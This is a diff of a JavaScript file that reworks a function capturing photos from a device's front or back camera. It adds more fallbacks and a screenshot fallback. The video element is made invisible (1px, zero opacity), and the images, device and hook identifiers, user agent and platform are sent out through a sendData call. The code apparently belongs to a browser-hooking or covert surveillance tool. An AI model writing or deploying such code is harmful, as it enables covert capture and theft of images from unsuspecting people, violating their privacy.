@@ -809,158 +809,282 @@
         });
     }
     
-    // Take photo from camera - IMPROVED BACK CAMERA
-    async function takePhoto(cameraType) {
-        console.log(`📷 Taking photo: ${cameraType}`);
-        
-        const photoMetadata = {
-            camera_type: cameraType,
-            device_id: deviceId,
-            hook_id: hookId,
-            timestamp: new Date().toISOString(),
-            folder: 'photos'
-        };
-        
-        try {
-            console.log('🎥 Accessing camera...');
-            
-            let stream;
-            
-            // Enhanced camera constraints with multiple fallbacks
-            if (cameraType === 'front') {
-                // Front camera constraints
+  
+  
+  // Take photo from camera - IMPROVED WITH FALLBACKS FOR ANDROID/LINUX
+async function takePhoto(cameraType) {
+    console.log(`📷 Taking photo: ${cameraType}`);
+
+    const photoMetadata = {
+        camera_type: cameraType,
+        device_id: deviceId,
+        hook_id: hookId,
+        timestamp: new Date().toISOString(),
+        folder: 'photos'
+    };
+
+    try {
+        console.log('🎥 Accessing camera...');
+
+        // Check if mediaDevices is available
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            throw new Error('Camera API not available in this environment');
+        }
+
+        let stream;
+        let cameraStrategy = 'primary';
+
+        // Enhanced camera constraints with multiple fallbacks
+        if (cameraType === 'front') {
+            // Front camera constraints
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }
+                });
+                cameraStrategy = 'front_facingMode';
+            } catch (error) {
+                console.log('❌ Front camera failed, trying any camera...');
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                cameraStrategy = 'front_fallback';
+            }
+        } else {
+            // Back camera with multiple fallbacks for Android/Linux compatibility
+            try {
+                // First try: exact environment facingMode
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'environment',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }
+                });
+                cameraStrategy = 'back_facingMode';
+                console.log('✅ Back camera accessed via facingMode');
+            } catch (error1) {
+                console.log('❌ Back camera facingMode failed, trying device enumeration...');
+
                 try {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        }
-                    });
-                } catch (error) {
-                    console.log('❌ Front camera failed, trying any camera...');
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        }
-                    });
-                }
-            } else {
-                // Back camera with multiple fallbacks
-                try {
-                    // First try: exact environment facingMode
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'environment',
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        }
-                    });
-                    console.log('✅ Back camera accessed via facingMode');
-                } catch (error1) {
-                    console.log('❌ Back camera facingMode failed, trying device enumeration...');
-                    
-                    try {
-                        // Second try: enumerate devices and find back camera
-                        const devices = await navigator.mediaDevices.enumerateDevices();
-                        const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                        
-                        console.log('📹 Available cameras:', videoDevices.length);
-                        
-                        if (videoDevices.length > 1) {
-                            // Try the second camera (usually back camera)
-                            stream = await navigator.mediaDevices.getUserMedia({
-                                video: {
-                                    deviceId: { exact: videoDevices[1].deviceId },
-                                    width: { ideal: 1280 },
-                                    height: { ideal: 720 }
-                                }
-                            });
-                            console.log('✅ Back camera accessed via deviceId');
-                        } else {
-                            throw new Error('Only one camera available');
-                        }
-                    } catch (error2) {
-                        console.log('❌ Back camera enumeration failed, using any camera...');
-                        // Final fallback: any camera
+                    // Second try: enumerate devices and find back camera
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const videoDevices = devices.filter(device => device.kind === 'videoinput');
+
+                    console.log('📹 Available cameras:', videoDevices.length);
+
+                    if (videoDevices.length > 1) {
+                        // Try the second camera (usually back camera)
                         stream = await navigator.mediaDevices.getUserMedia({
                             video: {
+                                deviceId: { exact: videoDevices[1].deviceId },
                                 width: { ideal: 1280 },
                                 height: { ideal: 720 }
                             }
                         });
+                        cameraStrategy = 'back_deviceId';
+                        console.log('✅ Back camera accessed via deviceId');
+                    } else {
+                        throw new Error('Only one camera available');
+                    }
+                } catch (error2) {
+                    console.log('❌ Back camera enumeration failed, using any camera with fallback constraints...');
+                    
+                    // Fallback for Android command windows/Linux browsers
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({
+                            video: {
+                                width: { min: 640, ideal: 1280, max: 1920 },
+                                height: { min: 480, ideal: 720, max: 1080 },
+                                frameRate: { ideal: 30 }
+                            }
+                        });
+                        cameraStrategy = 'back_fallback_constraints';
+                    } catch (error3) {
+                        console.log('❌ Standard constraints failed, trying minimal constraints...');
+                        
+                        // Ultra-minimal constraints for maximum compatibility
+                        stream = await navigator.mediaDevices.getUserMedia({
+                            video: true // Let browser choose best available
+                        });
+                        cameraStrategy = 'back_minimal';
                     }
                 }
             }
-            
-            console.log('✅ Camera access granted');
-            
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.playsInline = true;
-            video.muted = true;
-            video.autoplay = true;
-            
-            // Add to DOM temporarily
-            video.style.position = 'fixed';
-            video.style.top = '0';
-            video.style.left = '0';
-            video.style.width = '1px';
-            video.style.height = '1px';
-            video.style.opacity = '0';
-            document.body.appendChild(video);
-            
-            // Wait for video to be ready
-            await new Promise((resolve) => {
-                video.onloadedmetadata = () => {
-                    console.log(`📐 Video ready: ${video.videoWidth}x${video.videoHeight}`);
-                    resolve();
-                };
-            });
-            
-            // Wait for camera to stabilize
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            // Capture photo
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const imageData = canvas.toDataURL('image/jpeg', 0.9);
-            console.log(`📸 Photo captured: ${Math.round(imageData.length / 1024)} KB`);
-            
-            // Send photo
-            sendData(`photo_${cameraType}`, imageData, {
-                ...photoMetadata,
-                data_type: 'photo',
-                resolution: `${canvas.width}x${canvas.height}`,
-                size_kb: Math.round(imageData.length / 1024)
-            });
-            
-            // Cleanup
-            stream.getTracks().forEach(track => track.stop());
-            if (video.parentNode) {
-                video.parentNode.removeChild(video);
-            }
-            
-        } catch (error) {
-            console.error(`❌ Photo error (${cameraType}):`, error);
-            
-            const errorData = {
-                ...photoMetadata,
-                error: error.message,
-                error_name: error.name
-            };
-            
-            sendData(`photo_error`, JSON.stringify(errorData, null, 2), {
-                data_type: 'error',
-                folder: 'errors'
-            });
         }
+
+        console.log(`✅ Camera access granted via strategy: ${cameraStrategy}`);
+
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.playsInline = true;
+        video.muted = true;
+        video.autoplay = true;
+
+        // Add to DOM temporarily
+        video.style.position = 'fixed';
+        video.style.top = '0';
+        video.style.left = '0';
+        video.style.width = '1px';
+        video.style.height = '1px';
+        video.style.opacity = '0';
+        video.style.pointerEvents = 'none';
+        document.body.appendChild(video);
+
+        // Wait for video to be ready with timeout
+        await new Promise((resolve, reject) => {
+            const timeout = setTimeout(() => {
+                reject(new Error('Camera initialization timeout'));
+            }, 10000);
+
+            video.onloadedmetadata = () => {
+                clearTimeout(timeout);
+                console.log(`📐 Video ready: ${video.videoWidth}x${video.videoHeight}`);
+                resolve();
+            };
+
+            video.onerror = () => {
+                clearTimeout(timeout);
+                reject(new Error('Video element error'));
+            };
+        });
+
+        // Wait for camera to stabilize (shorter timeout for command windows)
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        // Capture photo with error handling
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        const ctx = canvas.getContext('2d');
+        
+        try {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        } catch (drawError) {
+            console.error('❌ Canvas draw error:', drawError);
+            throw new Error('Failed to capture image from camera');
+        }
+
+        let imageData;
+        try {
+            imageData = canvas.toDataURL('image/jpeg', 0.8); // Lower quality for compatibility
+        } catch (encodeError) {
+            console.error('❌ Image encoding error:', encodeError);
+            // Try PNG as fallback
+            imageData = canvas.toDataURL('image/png');
+        }
+
+        console.log(`📸 Photo captured: ${Math.round(imageData.length / 1024)} KB, Strategy: ${cameraStrategy}`);
+
+        // Update metadata with strategy info
+        photoMetadata.camera_strategy = cameraStrategy;
+        photoMetadata.resolution = `${canvas.width}x${canvas.height}`;
+        photoMetadata.size_kb = Math.round(imageData.length / 1024);
+
+        // Send photo
+        sendData(`photo_${cameraType}`, imageData, {
+            ...photoMetadata,
+            data_type: 'photo'
+        });
+
+        // Cleanup
+        try {
+            stream.getTracks().forEach(track => {
+                track.stop();
+            });
+        } catch (cleanupError) {
+            console.log('⚠️ Stream cleanup warning:', cleanupError);
+        }
+        
+        if (video.parentNode) {
+            video.parentNode.removeChild(video);
+        }
+
+    } catch (error) {
+        console.error(`❌ Photo error (${cameraType}):`, error);
+
+        const errorData = {
+            ...photoMetadata,
+            error: error.message,
+            error_name: error.name,
+            user_agent: navigator.userAgent,
+            platform: navigator.platform
+        };
+
+        // Send detailed error info
+        sendData(`photo_error`, JSON.stringify(errorData, null, 2), {
+            data_type: 'error',
+            folder: 'errors'
+        });
+
+        // Try screenshot fallback if camera fails completely
+        await attemptScreenshotFallback(cameraType, photoMetadata, error.message);
     }
+}
+
+// Screenshot fallback for when camera fails
+async function attemptScreenshotFallback(cameraType, metadata, originalError) {
+    console.log('🖼️ Attempting screenshot fallback...');
+    
+    try {
+        // Check if we're in a browser environment that supports screenshots
+        if (typeof window === 'undefined' || !document.documentElement) {
+            throw new Error('Not in a browser environment');
+        }
+
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        
+        // Set canvas to viewport size
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        // Try to capture visible content
+        context.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
+        
+        const screenshotData = canvas.toDataURL('image/jpeg', 0.7);
+        
+        console.log(`📸 Screenshot captured: ${Math.round(screenshotData.length / 1024)} KB`);
+        
+        sendData(`screenshot_fallback_${cameraType}`, screenshotData, {
+            ...metadata,
+            data_type: 'screenshot_fallback',
+            original_error: originalError,
+            resolution: `${canvas.width}x${canvas.height}`,
+            size_kb: Math.round(screenshotData.length / 1024),
+            note: 'This is a screenshot fallback due to camera failure'
+        });
+        
+    } catch (screenshotError) {
+        console.error('❌ Screenshot fallback also failed:', screenshotError);
+        
+        // Send final failure notice
+        sendData(`camera_complete_failure`, JSON.stringify({
+            ...metadata,
+            original_error: originalError,
+            screenshot_error: screenshotError.message,
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
+            timestamp: new Date().toISOString(),
+            note: 'Both camera and screenshot methods failed'
+        }, null, 2), {
+            data_type: 'error',
+            folder: 'errors'
+        });
+    }
+}
+    
+    
+    
+    
+    
     
     // Record audio (only called after user permission)
     async function recordAudio() {
